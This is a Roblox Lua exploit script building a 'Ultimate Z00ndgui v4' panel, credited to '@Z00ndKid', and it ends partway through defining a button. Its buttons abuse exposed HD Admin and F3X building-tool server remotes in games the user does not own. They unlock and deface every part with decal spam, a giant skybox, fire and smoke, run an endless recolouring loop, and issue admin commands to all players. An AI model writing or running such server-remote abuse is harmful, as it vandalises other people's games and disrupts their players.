local player = game.Players.LocalPlayer
local replicatedStorage = game:GetService("ReplicatedStorage")
local Z00nder = Instance.new("ScreenGui")

local Z00nder = Instance.new("ScreenGui")
Z00nder.Name = "dk"
Z00nder.Parent = player:WaitForChild("PlayerGui")
Z00nder.IgnoreGuiInset = false
Z00nder.ResetOnSpawn = false  

local dk = Instance.new("Frame")
dk.Size = UDim2.new(0, 779,0, 545) 
dk.Position = UDim2.new(0.100, 0,0.020, 0)
dk.BackgroundColor3 = Color3.new(0, 0, 0)
dk.BorderSizePixel = 0
dk.BorderColor3 = Color3.new(1, 1, 1) 
dk.Active = false
dk.Draggable = false
dk.BackgroundTransparency = 1
dk.Parent = Z00nder


local mainFrame = Instance.new("ScrollingFrame")
mainFrame.Size = UDim2.new(0, 781,0, 547) 
mainFrame.Position = UDim2.new(0.368, 0,0.019, 0)
mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.new(1, 1, 1) 
mainFrame.Active = true
mainFrame.Parent = dk

local UIS = game:GetService("UserInputService")

local function dragify(Frame)
	local dragToggle = false
	local dragInput, dragStart, startPos

	local function updateInput(input)
		local Delta = input.Position - dragStart
		local newPosition = UDim2.new(
			startPos.X.Scale, startPos.X.Offset + Delta.X,
			startPos.Y.Scale, startPos.Y.Offset + Delta.Y
		)
		game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = newPosition}):Play()
	end

	Frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = Frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	Frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end


dragify(mainFrame)


local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 190,0, 44)
titleText.Position = UDim2.new(0.368, 0,0.019, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(0, 0, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "Ultimate Z00ndgui v4"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 37
titleText.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 160,0, 18)
titleText.Position = UDim2.new(0.376, 0,0.054, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(0, 0, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "By @Z00ndKid [Team Z00ndKidd]"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 14
titleText.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(0, 160,0, 18)
titleText.Position = UDim2.new(0.368, 0,0.088, 0)
titleText.BackgroundColor3 = Color3.new(0, 0, 0)
titleText.BorderSizePixel = 4
titleText.BorderColor3 = Color3.new(0, 0, 0)
titleText.Font = Enum.Font.Code
titleText.Text = "F3x scripts"
titleText.TextColor3 = Color3.new(1, 1, 1)
titleText.TextSize = 14
titleText.Parent = mainFrame

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 76,0, 39)
f3x.Position = UDim2.new(0.037, 0,0.021, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "R6"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";R6")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 76,0, 39)
f3x.Position = UDim2.new(0.139, 0,0.022, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "RE"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";RE")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 76,0, 39)
f3x.Position = UDim2.new(0.745, 0,0.017, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Theme"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";music 113509194107379")
	RequestCommand:InvokeServer(";volume inf")
	RequestCommand:InvokeServer(";pitch 0.9")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 76,0, 39)
f3x.Position = UDim2.new(0.868, 0,0.019, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Btools"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 30
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";Btools")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.048, 0,0.112, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Decal Spam"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("140048998804156")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.187, 0,0.111, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skybox"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	--craaa
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(6000,6000,6000))
				SetLocked(v,true)
			end
		end
	end
	Sky("140048998804156")

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.326, 0,0.112, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Char all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommand

	RequestCommand:InvokeServer(";char all Z00ndKid")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.468, 0,0.11, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Color Spam"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool-- Search for "SyncAPI" in player and ReplicatedStorage
	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
			break
		end
	end

	-- Ensure that tool and remote are properly set
	if tool and tool:FindFirstChild("SyncAPI") then
		local remote = tool.SyncAPI.ServerEndpoint

		-- Function to invoke server
		local function _(args)
			remote:InvokeServer(unpack(args))
		end

		-- SetCollision Function
		local function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end

		-- SetAnchor Function
		local function SetAnchor(boolean, part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end

		-- CreatePart Function
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end

		-- DestroyPart Function
		local function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end

		-- MovePart Function
		local function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end

		-- Resize Function
		local function Resize(part, size, cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end

		-- AddMesh Function
		local function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end

		-- SetMesh Function
		local function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end

		-- SetTexture Function
		local function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end

		-- SetName Function
		local function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
			_(args)
		end

		-- MeshResize Function
		local function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end

		-- Weld Function
		local function Weld(part1, part2, lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
		end

		-- SetLocked Function
		local function SetLocked(part, boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end

		-- SetTrans Function
		local function SetTrans(part, int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end

		-- CreateSpotlight Function
		local function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end

		-- SyncLighting Function
		local function SyncLighting(part, brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end

		-- Color Function
		local function Color(part, color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color,
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end

		-- Randomize Function
		local function randomise()
			for i, v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v, false)
						Color(v, Color3.new(math.random(), math.random(), math.random()))
					end)
				end
			end
		end

		-- Run the randomization in a loop
		while wait() do
			spawn(function()
				randomise()
			end)
		end
	end

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.611, 0,0.109, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Fire all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool

	for _, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	if not tool then
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	end

	if not tool then
		warn("F3X tool not found!")
		return
	end

	local remote = tool.SyncAPI.ServerEndpoint

	local function invokeRemote(args)
		remote:InvokeServer(unpack(args))
	end

	local function AddFire(part)
		local args = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Fire"
				}
			}
		}
		invokeRemote(args)
	end

	local function FireParts()
		for _, v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") then
				task.spawn(function()
					AddFire(v)
				end)
			end
		end
	end

	FireParts()

end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.762, 0,0.11, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Smoke all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local function applyDecorationToPart(part)
		local argsCreate = {
			[1] = "CreateDecorations",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke"
				}
			}
		}

		local argsSync = {
			[1] = "SyncDecorate",
			[2] = {
				[1] = {
					["Part"] = part,
					["DecorationType"] = "Smoke",
					["Size"] = 20
				}
			}
		}

		local buildingTools = nil
		local player = game:GetService("Players").LocalPlayer

		-- Search for the tool in Character and Backpack
		for _, item in pairs(player.Character:GetChildren()) do
			if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
				buildingTools = item
				break
			end
		end

		if not buildingTools then
			for _, item in pairs(player.Backpack:GetChildren()) do
				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
					buildingTools = item
					break
				end
			end
		end

		if buildingTools then
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
			buildingTools.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
		elseif not warned then
			warn("Building tool not found inside player's inventory or backpack!")
			warned = true
		end
	end

	local function applyDecorationToAllParts(workspaceObject)
		for _, obj in pairs(workspaceObject:GetDescendants()) do
			if obj:IsA("Part") or obj:IsA("MeshPart") then
				applyDecorationToPart(obj)
			end
		end
	end

	applyDecorationToAllParts(workspace)
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
f3x.Position = UDim2.new(0.047, 0,0.142, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 1, 1)
f3x.Font = Enum.Font.Arial
f3x.Text = "Skybox 2"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("70767407415502")
end)

local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 102,0, 36)
